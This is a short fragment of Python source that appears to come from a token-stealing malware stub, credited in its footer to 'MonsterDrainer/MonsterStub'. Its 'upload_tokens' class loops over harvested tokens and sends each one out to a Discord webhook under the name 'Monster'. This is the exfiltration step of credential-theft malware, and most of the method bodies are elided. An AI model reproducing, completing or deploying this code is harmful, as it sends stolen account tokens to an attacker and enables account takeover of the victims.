...
class upload_tokens:
    ...
    def upload(self):
        ...
        for token in self.tokens:
            ...
            embed.set_footer(text="github.com/MonsterDrainer/MonsterStub")

            self.webhook.send(embed=embed, username="Monster",
                              avatar_url="https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/b8dfa9d5-5e16-4eb9-bee5-44962c913ce9/d8urwz-b9be7ce3-4357-4d95-ad29-a7ec43b1b151.jpg/v1/fill/w_955,h_602,q_75,strp/glowing_red_eyes_in_the_dark_by_roiler_d8urwz-fullview.jpg?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..E9rllenqx1FHhSE-MOrpJl0slDc2uc5hrcedyxbEulQ")
